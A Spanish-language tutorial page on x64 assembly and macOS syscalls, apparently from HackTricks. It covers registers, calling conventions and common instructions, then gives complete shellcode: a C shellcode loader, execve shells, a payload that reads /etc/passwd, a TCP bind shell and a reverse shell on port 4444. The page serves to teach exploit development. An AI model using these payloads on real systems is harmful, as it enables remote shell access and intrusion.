# Introducción a x64

{{#include ../../../banners/hacktricks-training.md}}

## **Introducción a x64**

x64, también conocido como x86-64, es una arquitectura de procesadores de 64 bits utilizada principalmente en equipos de escritorio y servidores. Originada a partir de la arquitectura x86 producida por Intel y adoptada posteriormente por AMD con el nombre AMD64, actualmente es la arquitectura predominante en ordenadores personales y servidores.

### **Registros**

x64 amplía la arquitectura x86 e incluye **16 registros de propósito general** denominados `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi` y desde `r8` hasta `r15`. Cada uno de ellos puede almacenar un valor de **64 bits** (8 bytes). Estos registros también tienen subregistros de 32, 16 y 8 bits para ofrecer compatibilidad y realizar tareas específicas.

1. **`rax`** - Tradicionalmente utilizado para los **valores de retorno** de las funciones.
2. **`rbx`** - Utilizado habitualmente como **registro base** para operaciones de memoria.
3. **`rcx`** - Utilizado comúnmente como **contador de bucles**.
4. **`rdx`** - Utilizado en varias funciones, incluidas las operaciones aritméticas extendidas.
5. **`rbp`** - **Puntero base** del stack frame.
6. **`rsp`** - **Puntero de stack**, que mantiene la posición de la parte superior del stack.
7. **`rsi`** y **`rdi`** - Utilizados como índices de **origen** y **destino** en operaciones con strings/memoria.
8. **`r8`** a **`r15`** - Registros adicionales de propósito general introducidos en x64.

### **Convención de llamada**

La convención de llamada de x64 varía según el sistema operativo. Por ejemplo:

- **Windows**: Los primeros **cuatro parámetros** se pasan en los registros **`rcx`**, **`rdx`**, **`r8`** y **`r9`**. Los parámetros adicionales se introducen en el stack. El valor de retorno se encuentra en **`rax`**.
- **System V (utilizado habitualmente en sistemas similares a UNIX)**: Los primeros **seis parámetros enteros o de tipo puntero** se pasan en los registros **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`** y **`r9`**. El valor de retorno también se encuentra en **`rax`**.

Si la función tiene más de seis entradas, el **resto se pasará en el stack**. **RSP**, el puntero de stack, tiene que estar **alineado a 16 bytes**, lo que significa que la dirección a la que apunta debe ser divisible por 16 antes de que se produzca cualquier llamada. Esto significa que normalmente tendríamos que asegurarnos de que RSP esté correctamente alineado en nuestro shellcode antes de realizar una llamada a una función. Sin embargo, en la práctica, las llamadas al sistema funcionan muchas veces aunque no se cumpla este requisito.

### Convención de llamada en Swift

Swift tiene su propia **convención de llamada**, que puede encontrarse en [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)

### **Instrucciones comunes**

Las instrucciones x64 cuentan con un conjunto amplio, mantienen la compatibilidad con las instrucciones x86 anteriores e introducen otras nuevas.

- **`mov`**: **Mueve** un valor de un **registro** o una **ubicación de memoria** a otra.
- Ejemplo: `mov rax, rbx` — Mueve el valor de `rbx` a `rax`.
- **`push`** y **`pop`**: Introducen o extraen valores del **stack**.
- Ejemplo: `push rax` — Introduce el valor de `rax` en el stack.
- Ejemplo: `pop rax` — Extrae el valor superior del stack y lo introduce en `rax`.
- **`add`** y **`sub`**: Operaciones de **suma** y **resta**.
- Ejemplo: `add rax, rcx` — Suma los valores de `rax` y `rcx`, y almacena el resultado en `rax`.
- **`mul`** y **`div`**: Operaciones de **multiplicación** y **división**. Nota: tienen comportamientos específicos respecto al uso de los operandos.
- **`call`** y **`ret`**: Se utilizan para **llamar a funciones** y **retornar de ellas**.
- **`int`**: Se utiliza para activar una **interrupción** de software. Por ejemplo, `int 0x80` se utilizaba para realizar llamadas al sistema en Linux x86 de 32 bits.
- **`cmp`**: **Compara** dos valores y establece los flags de la CPU según el resultado.
- Ejemplo: `cmp rax, rdx` — Compara `rax` con `rdx`.
- **`je`, `jne`, `jl`, `jge`, ...**: Instrucciones de **salto condicional** que cambian el flujo de control según los resultados de un `cmp` o una prueba anterior.
- Ejemplo: Después de una instrucción `cmp rax, rdx`, `je label` — Salta a `label` si `rax` es igual a `rdx`.
- **`syscall`**: Se utiliza para realizar **llamadas al sistema** en algunos sistemas x64 (como los Unix modernos).
- **`sysenter`**: Una instrucción optimizada de **llamada al sistema** en algunas plataformas.

### **Prólogo de función**

1. **Introducir el puntero base antiguo**: `push rbp` (guarda el puntero base del caller)
2. **Mover el puntero de stack actual al puntero base**: `mov rbp, rsp` (configura el nuevo puntero base para la función actual)
3. **Reservar espacio en el stack para las variables locales**: `sub rsp, <size>` (donde `<size>` es el número de bytes necesarios)

### **Epílogo de función**

1. **Mover el puntero base actual al puntero de stack**: `mov rsp, rbp` (libera las variables locales)
2. **Extraer el puntero base antiguo del stack**: `pop rbp` (restaura el puntero base del caller)
3. **Retornar**: `ret` (devuelve el control al caller)

## macOS

### syscalls

Existen diferentes clases de syscalls; puedes [**encontrarlas aquí**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
Entonces, puedes encontrar cada número de syscall [**en esta URL**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
Por lo tanto, para llamar al syscall `open` (**5**) de la **clase Unix/BSD**, debes añadirlo: `0x2000000`

Por lo tanto, el número de syscall para llamar a open sería `0x2000005`

### Shellcodes

Para compilar:
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
Para extraer los bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
<details>

<summary>Código C para probar el shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Tomado de [**aquí**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) y explicado.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}
{{#endtabs}}

#### Leer con cat

El objetivo es ejecutar `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, por lo que el segundo argumento (x1) es un array de parámetros (que en memoria significa una pila de direcciones).
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### Invocar comando con sh
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

Bind shell de [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) en el **puerto 4444**<sup>[[2]](#references)</sup>.
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Reverse Shell

Reverse shell desde [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Reverse shell hacia **127.0.0.1:4444**<sup>[[3]](#references)</sup>.
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
## Referencias

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [Packet Storm - macOS TCP 4444 Bind Shell (Null-Free) Shellcode](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)
- [3] [Packet Storm - macOS 127.0.0.1:4444 Reverse Shell Shellcode](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)

{{#include ../../../banners/hacktricks-training.md}}
